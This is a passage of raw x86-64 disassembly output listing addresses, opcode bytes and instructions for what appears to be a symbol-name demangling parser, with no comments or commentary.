   2dc494f46:	48 63 d0             	movslq %eax,%rdx
   2dc494f49:	83 c0 01             	add    $0x1,%eax
   2dc494f4c:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494f50:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494f54:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494f5b:	00 
   2dc494f5c:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494f5f:	48 8d 05 7a 4f 02 00 	lea    0x24f7a(%rip),%rax        # 0x2dc4b9ee0
   2dc494f66:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494f6c:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494f70:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   2dc494f74:	e9 c5 f9 ff ff       	jmp    0x2dc49493e
   2dc494f79:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494f7c:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494f7f:	0f 8d 50 1a 02 00    	jge    0x2dc4b69d5
   2dc494f85:	48 63 d0             	movslq %eax,%rdx
   2dc494f88:	83 c0 01             	add    $0x1,%eax
   2dc494f8b:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494f8f:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494f93:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494f9a:	00 
   2dc494f9b:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494f9e:	48 8d 05 7b 4f 02 00 	lea    0x24f7b(%rip),%rax        # 0x2dc4b9f20
   2dc494fa5:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494fab:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494faf:	83 43 48 0a          	addl   $0xa,0x48(%rbx)
   2dc494fb3:	e9 86 f9 ff ff       	jmp    0x2dc49493e
   2dc494fb8:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494fbb:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494fbe:	0f 8d 11 1a 02 00    	jge    0x2dc4b69d5
   2dc494fc4:	48 63 d0             	movslq %eax,%rdx
   2dc494fc7:	83 c0 01             	add    $0x1,%eax
   2dc494fca:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494fce:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494fd2:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494fd9:	00 
   2dc494fda:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494fdd:	48 8d 05 1c 4f 02 00 	lea    0x24f1c(%rip),%rax        # 0x2dc4b9f00
   2dc494fe4:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494fea:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494fee:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   2dc494ff2:	e9 47 f9 ff ff       	jmp    0x2dc49493e
   2dc494ff7:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494ffa:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494ffd:	0f 8d 65 fc ff ff    	jge    0x2dc494c68
   2dc495003:	48 63 d0             	movslq %eax,%rdx
   2dc495006:	83 c0 01             	add    $0x1,%eax
   2dc495009:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc49500c:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc495010:	48 8d 05 01 36 02 00 	lea    0x23601(%rip),%rax        # 0x2dc4b8618
   2dc495017:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc49501b:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc495022:	00 
   2dc495023:	c7 02 00 00 00 00    	movl   $0x0,(%rdx)
   2dc495029:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc49502d:	c7 42 18 0e 00 00 00 	movl   $0xe,0x18(%rdx)
   2dc495034:	e9 05 f9 ff ff       	jmp    0x2dc49493e
   2dc495039:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc49503c:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc49503f:	0f 8d 23 fc ff ff    	jge    0x2dc494c68
   2dc495045:	48 63 d0             	movslq %eax,%rdx
   2dc495048:	83 c0 01             	add    $0x1,%eax
   2dc49504b:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc49504e:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc495052:	48 8d 05 ba 35 02 00 	lea    0x235ba(%rip),%rax        # 0x2dc4b8613
   2dc495059:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc49505d:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc495064:	00 
   2dc495065:	c7 02 00 00 00 00    	movl   $0x0,(%rdx)
   2dc49506b:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc49506f:	c7 42 18 04 00 00 00 	movl   $0x4,0x18(%rdx)
   2dc495076:	e9 c3 f8 ff ff       	jmp    0x2dc49493e
   2dc49507b:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc49507e:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc495081:	0f 8d 4e 19 02 00    	jge    0x2dc4b69d5
   2dc495087:	48 63 d0             	movslq %eax,%rdx
   2dc49508a:	83 c0 01             	add    $0x1,%eax
   2dc49508d:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc495091:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc495095:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc49509c:	00 
   2dc49509d:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc4950a0:	48 8d 05 19 4f 02 00 	lea    0x24f19(%rip),%rax        # 0x2dc4b9fc0
   2dc4950a7:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc4950ad:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc4950b1:	83 43 48 11          	addl   $0x11,0x48(%rbx)
   2dc4950b5:	e9 84 f8 ff ff       	jmp    0x2dc49493e
   2dc4950ba:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc4950bd:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc4950c0:	0f 8d 0f 19 02 00    	jge    0x2dc4b69d5
   2dc4950c6:	48 63 d0             	movslq %eax,%rdx
   2dc4950c9:	83 c0 01             	add    $0x1,%eax
   2dc4950cc:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc4950d0:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc4950d4:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc4950db:	00 
   2dc4950dc:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc4950df:	48 8d 05 ba 4e 02 00 	lea    0x24eba(%rip),%rax        # 0x2dc4b9fa0
   2dc4950e6:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc4950ec:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc4950f0:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   2dc4950f4:	e9 45 f8 ff ff       	jmp    0x2dc49493e
   2dc4950f9:	48 89 d9             	mov    %rbx,%rcx
   2dc4950fc:	e8 5f f7 ff ff       	call   0x2dc494860
   2dc495101:	45 31 c9             	xor    %r9d,%r9d
   2dc495104:	ba 4c 00 00 00       	mov    $0x4c,%edx
   2dc495109:	48 89 d9             	mov    %rbx,%rcx
   2dc49510c:	49 89 c0             	mov    %rax,%r8
   2dc49510f:	e8 7c e7 ff ff       	call   0x2dc493890
   2dc495114:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc495119:	48 89 c6             	mov    %rax,%rsi
   2dc49511c:	e9 9f f8 ff ff       	jmp    0x2dc4949c0
   2dc495121:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc495128:	49 83 c0 01          	add    $0x1,%r8
   2dc49512c:	48 89 d9             	mov    %rbx,%rcx
   2dc49512f:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc495133:	e8 48 f3 ff ff       	call   0x2dc494480
   2dc495138:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc49513d:	48 89 c6             	mov    %rax,%rsi
   2dc495140:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc495144:	80 38 49             	cmpb   $0x49,(%rax)
   2dc495147:	0f 84 80 00 00 00    	je     0x2dc4951cd
   2dc49514d:	48 89 d9             	mov    %rbx,%rcx
   2dc495150:	e8 0b f7 ff ff       	call   0x2dc494860
   2dc495155:	49 89 f1             	mov    %rsi,%r9
   2dc495158:	ba 21 00 00 00       	mov    $0x21,%edx
   2dc49515d:	48 89 d9             	mov    %rbx,%rcx
   2dc495160:	49 89 c0             	mov    %rax,%r8
   2dc495163:	e8 28 e7 ff ff       	call   0x2dc493890
   2dc495168:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc49516d:	48 89 c6             	mov    %rax,%rsi
   2dc495170:	e9 4b f8 ff ff       	jmp    0x2dc4949c0
   2dc495175:	0f 1f 00             	nopl   (%rax)
   2dc495178:	83 e8 61             	sub    $0x61,%eax
   2dc49517b:	48 8d 15 1e 4a 02 00 	lea    0x24a1e(%rip),%rdx        # 0x2dc4b9ba0
   2dc495182:	8b 4b 28             	mov    0x28(%rbx),%ecx
   2dc495185:	48 98                	cltq
   2dc495187:	48 c1 e0 05          	shl    $0x5,%rax
   2dc49518b:	48 01 d0             	add    %rdx,%rax
   2dc49518e:	3b 4b 2c             	cmp    0x2c(%rbx),%ecx
   2dc495191:	0f 8d 3e 18 02 00    	jge    0x2dc4b69d5
   2dc495197:	48 63 d1             	movslq %ecx,%rdx
   2dc49519a:	49 83 c0 01          	add    $0x1,%r8
   2dc49519e:	83 c1 01             	add    $0x1,%ecx
   2dc4951a1:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc4951a5:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc4951a9:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc4951b0:	00 
   2dc4951b1:	89 4b 28             	mov    %ecx,0x28(%rbx)
   2dc4951b4:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc4951b8:	8b 40 08             	mov    0x8(%rax),%eax
   2dc4951bb:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc4951c1:	01 43 48             	add    %eax,0x48(%rbx)
   2dc4951c4:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc4951c8:	e9 71 f7 ff ff       	jmp    0x2dc49493e
   2dc4951cd:	48 83 c0 01          	add    $0x1,%rax
   2dc4951d1:	48 89 d9             	mov    %rbx,%rcx
   2dc4951d4:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc4951d8:	e8 53 25 00 00       	call   0x2dc497730
   2dc4951dd:	49 89 f0             	mov    %rsi,%r8
   2dc4951e0:	ba 04 00 00 00       	mov    $0x4,%edx
   2dc4951e5:	48 89 d9             	mov    %rbx,%rcx
   2dc4951e8:	49 89 c1             	mov    %rax,%r9
   2dc4951eb:	e8 a0 e6 ff ff       	call   0x2dc493890
   2dc4951f0:	48 89 c6             	mov    %rax,%rsi
   2dc4951f3:	e9 55 ff ff ff       	jmp    0x2dc49514d
   2dc4951f8:	8b 7b 4c             	mov    0x4c(%rbx),%edi
   2dc4951fb:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   2dc495202:	48 89 d9             	mov    %rbx,%rcx
   2dc495205:	e8 e6 0b 00 00       	call   0x2dc495df0
   2dc49520a:	89 7b 4c             	mov    %edi,0x4c(%rbx)
   2dc49520d:	48 89 c6             	mov    %rax,%rsi
   2dc495210:	48 85 c0             	test   %rax,%rax
   2dc495213:	0f 84 4f fa ff ff    	je     0x2dc494c68
   2dc495219:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   2dc49521d:	41 0f b6 02          	movzbl (%r10),%eax
   2dc495221:	e9 36 fa ff ff       	jmp    0x2dc494c5c
   2dc495226:	48 8d 47 01          	lea    0x1(%rdi),%rax
   2dc49522a:	48 89 d9             	mov    %rbx,%rcx
   2dc49522d:	44 8b 6b 28          	mov    0x28(%rbx),%r13d
   2dc495231:	44 8b 63 38          	mov    0x38(%rbx),%r12d
   2dc495235:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc495239:	8b 6b 48             	mov    0x48(%rbx),%ebp
   2dc49523c:	e8 ef 24 00 00       	call   0x2dc497730
   2dc495241:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc495245:	80 3a 49             	cmpb   $0x49,(%rdx)
   2dc495248:	74 14                	je     0x2dc49525e
   2dc49524a:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   2dc49524e:	44 89 6b 28          	mov    %r13d,0x28(%rbx)
   2dc495252:	44 89 63 38          	mov    %r12d,0x38(%rbx)
   2dc495256:	89 6b 48             	mov    %ebp,0x48(%rbx)
   2dc495259:	e9 62 f7 ff ff       	jmp    0x2dc4949c0
   2dc49525e:	48 85 f6             	test   %rsi,%rsi
   2dc495261:	0f 84 01 fa ff ff    	je     0x2dc494c68
   2dc495267:	8b 53 38             	mov    0x38(%rbx),%edx
   2dc49526a:	3b 53 3c             	cmp    0x3c(%rbx),%edx
   2dc49526d:	0f 8d f5 f9 ff ff    	jge    0x2dc494c68
   2dc495273:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   2dc495277:	4c 63 c2             	movslq %edx,%r8
   2dc49527a:	83 c2 01             	add    $0x1,%edx
   2dc49527d:	4a 89 34 c1          	mov    %rsi,(%rcx,%r8,8)
   2dc495281:	89 53 38             	mov    %edx,0x38(%rbx)
   2dc495284:	e9 55 f9 ff ff       	jmp    0x2dc494bde
   2dc495289:	83 f8 10             	cmp    $0x10,%eax
   2dc49528c:	0f 85 d6 f9 ff ff    	jne    0x2dc494c68
   2dc495292:	48 83 c2 01          	add    $0x1,%rdx
   2dc495296:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc49529a:	8b 53 28             	mov    0x28(%rbx),%edx
   2dc49529d:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   2dc4952a0:	0f 8d 2f 17 02 00    	jge    0x2dc4b69d5
   2dc4952a6:	48 63 c2             	movslq %edx,%rax
   2dc4952a9:	45 31 c0             	xor    %r8d,%r8d
   2dc4952ac:	48 8d 3d 4d 4d 02 00 	lea    0x24d4d(%rip),%rdi        # 0x2dc4ba000
   2dc4952b3:	83 c2 01             	add    $0x1,%edx
   2dc4952b6:	48 c1 e0 05          	shl    $0x5,%rax
   2dc4952ba:	48 03 43 20          	add    0x20(%rbx),%rax
   2dc4952be:	4c 89 40 04          	mov    %r8,0x4(%rax)
   2dc4952c2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc4952c7:	89 53 28             	mov    %edx,0x28(%rbx)
   2dc4952ca:	c7 00 27 00 00 00    	movl   $0x27,(%rax)
   2dc4952d0:	48 89 78 10          	mov    %rdi,0x10(%rax)
   2dc4952d4:	8b 43 48             	mov    0x48(%rbx),%eax
   2dc4952d7:	83 c0 0f             	add    $0xf,%eax
   2dc4952da:	e9 d0 fb ff ff       	jmp    0x2dc494eaf
   2dc4952df:	49 83 c0 03          	add    $0x3,%r8
   2dc4952e3:	8b 7b 4c             	mov    0x4c(%rbx),%edi
   2dc4952e6:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   2dc4952ed:	48 89 d9             	mov    %rbx,%rcx
   2dc4952f0:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc4952f4:	e8 f7 0a 00 00       	call   0x2dc495df0
   2dc4952f9:	89 7b 4c             	mov    %edi,0x4c(%rbx)
   2dc4952fc:	48 89 c6             	mov    %rax,%rsi
   2dc4952ff:	48 85 c0             	test   %rax,%rax
   2dc495302:	0f 85 81 fa ff ff    	jne    0x2dc494d89
   2dc495308:	31 d2                	xor    %edx,%edx
   2dc49530a:	e9 2f f6 ff ff       	jmp    0x2dc49493e
   2dc49530f:	90                   	nop
   2dc495310:	56                   	push   %rsi
   2dc495311:	53                   	push   %rbx
   2dc495312:	48 83 ec 38          	sub    $0x38,%rsp
   2dc495316:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   2dc49531d:	00 00 
   2dc49531f:	48 89 cb             	mov    %rcx,%rbx
   2dc495322:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   2dc495326:	0f b6 01             	movzbl (%rcx),%eax
   2dc495329:	84 c0                	test   %al,%al
   2dc49532b:	0f 94 c2             	sete   %dl
   2dc49532e:	3c 45                	cmp    $0x45,%al
   2dc495330:	41 0f 94 c0          	sete   %r8b
   2dc495334:	44 08 c2             	or     %r8b,%dl
   2dc495337:	75 6c                	jne    0x2dc4953a5
   2dc495339:	3c 2e                	cmp    $0x2e,%al
   2dc49533b:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
   2dc495340:	0f 94 c2             	sete   %dl
   2dc495343:	84 d2                	test   %dl,%dl
   2dc495345:	74 40                	je     0x2dc495387
   2dc495347:	eb 5c                	jmp    0x2dc4953a5
   2dc495349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc495350:	45 31 c9             	xor    %r9d,%r9d
   2dc495353:	ba 2e 00 00 00       	mov    $0x2e,%edx
   2dc495358:	48 89 d9             	mov    %rbx,%rcx
   2dc49535b:	e8 30 e5 ff ff       	call   0x2dc493890
   2dc495360:	48 89 06             	mov    %rax,(%rsi)
   2dc495363:	48 85 c0             	test   %rax,%rax
   2dc495366:	74 3d                	je     0x2dc4953a5
   2dc495368:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   2dc49536c:	48 8d 70 18          	lea    0x18(%rax),%rsi
   2dc495370:	0f b6 01             	movzbl (%rcx),%eax
   2dc495373:	84 c0                	test   %al,%al
   2dc495375:	0f 94 c2             	sete   %dl
   2dc495378:	3c 45                	cmp    $0x45,%al
   2dc49537a:	41 0f 94 c0          	sete   %r8b
   2dc49537e:	44 08 c2             	or     %r8b,%dl
   2dc495381:	75 2d                	jne    0x2dc4953b0
   2dc495383:	3c 2e                	cmp    $0x2e,%al
   2dc495385:	74 29                	je     0x2dc4953b0
   2dc495387:	3c 52                	cmp    $0x52,%al
   2dc495389:	74 04                	je     0x2dc49538f
   2dc49538b:	3c 4f                	cmp    $0x4f,%al
   2dc49538d:	75 06                	jne    0x2dc495395
   2dc49538f:	80 79 01 45          	cmpb   $0x45,0x1(%rcx)
   2dc495393:	74 1b                	je     0x2dc4953b0
   2dc495395:	48 89 d9             	mov    %rbx,%rcx
   2dc495398:	e8 c3 f4 ff ff       	call   0x2dc494860
   2dc49539d:	49 89 c0             	mov    %rax,%r8
   2dc4953a0:	48 85 c0             	test   %rax,%rax
   2dc4953a3:	75 ab                	jne    0x2dc495350
   2dc4953a5:	31 c0                	xor    %eax,%eax
   2dc4953a7:	48 83 c4 38          	add    $0x38,%rsp
   2dc4953ab:	5b                   	pop    %rbx
   2dc4953ac:	5e                   	pop    %rsi
   2dc4953ad:	c3                   	ret
   2dc4953ae:	66 90                	xchg   %ax,%ax
   2dc4953b0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   2dc4953b5:	48 85 c0             	test   %rax,%rax
   2dc4953b8:	74 eb                	je     0x2dc4953a5
   2dc4953ba:	48 83 78 18 00       	cmpq   $0x0,0x18(%rax)
   2dc4953bf:	75 e6                	jne    0x2dc4953a7
   2dc4953c1:	48 8b 50 10          	mov    0x10(%rax),%rdx
   2dc4953c5:	83 3a 27             	cmpl   $0x27,(%rdx)
   2dc4953c8:	75 dd                	jne    0x2dc4953a7
   2dc4953ca:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   2dc4953ce:	83 7a 1c 09          	cmpl   $0x9,0x1c(%rdx)
   2dc4953d2:	75 d3                	jne    0x2dc4953a7
   2dc4953d4:	8b 52 08             	mov    0x8(%rdx),%edx
   2dc4953d7:	29 53 48             	sub    %edx,0x48(%rbx)
   2dc4953da:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   2dc4953e1:	00 
   2dc4953e2:	eb c3                	jmp    0x2dc4953a7
   2dc4953e4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc4953eb:	00 00 00 00 
   2dc4953ef:	90                   	nop
   2dc4953f0:	56                   	push   %rsi
   2dc4953f1:	53                   	push   %rbx
   2dc4953f2:	48 83 ec 28          	sub    $0x28,%rsp
   2dc4953f6:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc4953fa:	80 38 4a             	cmpb   $0x4a,(%rax)
   2dc4953fd:	48 89 cb             	mov    %rcx,%rbx
   2dc495400:	74 5e                	je     0x2dc495460
   2dc495402:	85 d2                	test   %edx,%edx
   2dc495404:	74 3a                	je     0x2dc495440
   2dc495406:	48 89 d9             	mov    %rbx,%rcx
   2dc495409:	e8 52 f4 ff ff       	call   0x2dc494860
   2dc49540e:	48 89 c6             	mov    %rax,%rsi
   2dc495411:	48 85 c0             	test   %rax,%rax
   2dc495414:	74 3c                	je     0x2dc495452
   2dc495416:	48 89 d9             	mov    %rbx,%rcx
   2dc495419:	e8 f2 fe ff ff       	call   0x2dc495310
   2dc49541e:	49 89 c1             	mov    %rax,%r9
   2dc495421:	48 85 c0             	test   %rax,%rax
   2dc495424:	74 2c                	je     0x2dc495452
   2dc495426:	49 89 f0             	mov    %rsi,%r8
   2dc495429:	ba 29 00 00 00       	mov    $0x29,%edx
   2dc49542e:	48 89 d9             	mov    %rbx,%rcx
   2dc495431:	48 83 c4 28          	add    $0x28,%rsp
   2dc495435:	5b                   	pop    %rbx
   2dc495436:	5e                   	pop    %rsi
   2dc495437:	e9 54 e4 ff ff       	jmp    0x2dc493890
   2dc49543c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc495440:	48 89 d9             	mov    %rbx,%rcx
   2dc495443:	31 f6                	xor    %esi,%esi
   2dc495445:	e8 c6 fe ff ff       	call   0x2dc495310
   2dc49544a:	49 89 c1             	mov    %rax,%r9
   2dc49544d:	48 85 c0             	test   %rax,%rax
   2dc495450:	75 d4                	jne    0x2dc495426
   2dc495452:	31 c0                	xor    %eax,%eax
   2dc495454:	48 83 c4 28          	add    $0x28,%rsp
   2dc495458:	5b                   	pop    %rbx
   2dc495459:	5e                   	pop    %rsi
   2dc49545a:	c3                   	ret
   2dc49545b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc495460:	48 83 c0 01          	add    $0x1,%rax
   2dc495464:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc495468:	eb 9c                	jmp    0x2dc495406
   2dc49546a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc495470:	53                   	push   %rbx
   2dc495471:	48 83 ec 20          	sub    $0x20,%rsp
   2dc495475:	48 89 cb             	mov    %rcx,%rbx
   2dc495478:	f6 41 12 04          	testb  $0x4,0x12(%rcx)
   2dc49547c:	75 2a                	jne    0x2dc4954a8
   2dc49547e:	8b 49 58             	mov    0x58(%rcx),%ecx
   2dc495481:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
   2dc495487:	77 28                	ja     0x2dc4954b1
   2dc495489:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc49548d:	8d 41 01             	lea    0x1(%rcx),%eax
   2dc495490:	89 43 58             	mov    %eax,0x58(%rbx)
   2dc495493:	31 c0                	xor    %eax,%eax
   2dc495495:	80 3a 46             	cmpb   $0x46,(%rdx)
   2dc495498:	74 26                	je     0x2dc4954c0
   2dc49549a:	89 4b 58             	mov    %ecx,0x58(%rbx)
   2dc49549d:	48 83 c4 20          	add    $0x20,%rsp
   2dc4954a1:	5b                   	pop    %rbx
   2dc4954a2:	c3                   	ret
   2dc4954a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc4954a8:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   2dc4954ac:	80 3a 46             	cmpb   $0x46,(%rdx)
   2dc4954af:	74 0f                	je     0x2dc4954c0
   2dc4954b1:	31 c0                	xor    %eax,%eax
   2dc4954b3:	48 83 c4 20          	add    $0x20,%rsp
   2dc4954b7:	5b                   	pop    %rbx
   2dc4954b8:	c3                   	ret
   2dc4954b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4954c0:	48 8d 42 01          	lea    0x1(%rdx),%rax
   2dc4954c4:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc4954c8:	80 7a 01 59          	cmpb   $0x59,0x1(%rdx)
   2dc4954cc:	75 08                	jne    0x2dc4954d6
   2dc4954ce:	48 83 c2 02          	add    $0x2,%rdx
   2dc4954d2:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc4954d6:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc4954db:	48 89 d9             	mov    %rbx,%rcx
   2dc4954de:	e8 0d ff ff ff       	call   0x2dc4953f0
   2dc4954e3:	48 89 d9             	mov    %rbx,%rcx
   2dc4954e6:	48 89 c2             	mov    %rax,%rdx
   2dc4954e9:	e8 52 e6 ff ff       	call   0x2dc493b40
   2dc4954ee:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc4954f2:	80 3a 45             	cmpb   $0x45,(%rdx)
   2dc4954f5:	74 19                	je     0x2dc495510
   2dc4954f7:	31 c0                	xor    %eax,%eax
   2dc4954f9:	f6 43 12 04          	testb  $0x4,0x12(%rbx)
   2dc4954fd:	75 9e                	jne    0x2dc49549d
   2dc4954ff:	8b 53 58             	mov    0x58(%rbx),%edx
   2dc495502:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   2dc495505:	eb 93                	jmp    0x2dc49549a
   2dc495507:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc49550e:	00 00 
   2dc495510:	48 83 c2 01          	add    $0x1,%rdx
   2dc495514:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc495518:	eb df                	jmp    0x2dc4954f9
   2dc49551a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc495520:	56                   	push   %rsi
   2dc495521:	53                   	push   %rbx
   2dc495522:	48 83 ec 28          	sub    $0x28,%rsp
   2dc495526:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc49552a:	80 38 54             	cmpb   $0x54,(%rax)
   2dc49552d:	48 89 cb             	mov    %rcx,%rbx
   2dc495530:	48 89 d6             	mov    %rdx,%rsi
   2dc495533:	75 41                	jne    0x2dc495576
   2dc495535:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   2dc495539:	80 fa 74             	cmp    $0x74,%dl
   2dc49553c:	0f 84 8e 00 00 00    	je     0x2dc4955d0
   2dc495542:	7f 3c                	jg     0x2dc495580
   2dc495544:	80 fa 6e             	cmp    $0x6e,%dl
   2dc495547:	74 67                	je     0x2dc4955b0
   2dc495549:	80 fa 70             	cmp    $0x70,%dl
   2dc49554c:	75 28                	jne    0x2dc495576
   2dc49554e:	48 83 c0 02          	add    $0x2,%rax
   2dc495552:	48 89 f2             	mov    %rsi,%rdx
   2dc495555:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc495559:	e8 c2 ff ff ff       	call   0x2dc495520
   2dc49555e:	ba 5b 00 00 00       	mov    $0x5b,%edx
   2dc495563:	49 89 c0             	mov    %rax,%r8
   2dc495566:	48 85 c0             	test   %rax,%rax
   2dc495569:	75 2a                	jne    0x2dc495595
   2dc49556b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc495570:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   2dc495576:	31 c0                	xor    %eax,%eax
   2dc495578:	48 83 c4 28          	add    $0x28,%rsp
   2dc49557c:	5b                   	pop    %rbx
   2dc49557d:	5e                   	pop    %rsi
   2dc49557e:	c3                   	ret
   2dc49557f:	90                   	nop
   2dc495580:	80 fa 79             	cmp    $0x79,%dl
   2dc495583:	75 f1                	jne    0x2dc495576
   2dc495585:	48 83 c0 02          	add    $0x2,%rax
   2dc495589:	ba 58 00 00 00       	mov    $0x58,%edx
   2dc49558e:	45 31 c0             	xor    %r8d,%r8d
   2dc495591:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc495595:	45 31 c9             	xor    %r9d,%r9d
   2dc495598:	48 89 d9             	mov    %rbx,%rcx
   2dc49559b:	48 83 c4 28          	add    $0x28,%rsp
   2dc49559f:	5b                   	pop    %rbx
   2dc4955a0:	5e                   	pop    %rsi
   2dc4955a1:	e9 ea e2 ff ff       	jmp    0x2dc493890
   2dc4955a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc4955ad:	00 00 00 
   2dc4955b0:	48 83 c0 02          	add    $0x2,%rax
   2dc4955b4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc4955b8:	e8 a3 f2 ff ff       	call   0x2dc494860
   2dc4955bd:	49 89 c0             	mov    %rax,%r8
   2dc4955c0:	48 85 c0             	test   %rax,%rax
   2dc4955c3:	74 ab                	je     0x2dc495570
   2dc4955c5:	ba 59 00 00 00       	mov    $0x59,%edx
   2dc4955ca:	eb c9                	jmp    0x2dc495595
   2dc4955cc:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc4955d0:	48 83 c0 02          	add    $0x2,%rax
   2dc4955d4:	48 89 f2             	mov    %rsi,%rdx
   2dc4955d7:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc4955db:	e8 30 00 00 00       	call   0x2dc495610
   2dc4955e0:	49 89 c0             	mov    %rax,%r8
   2dc4955e3:	48 85 c0             	test   %rax,%rax
   2dc4955e6:	74 88                	je     0x2dc495570
   2dc4955e8:	48 8b 43 18          	mov    0x18(%rbx),%rax
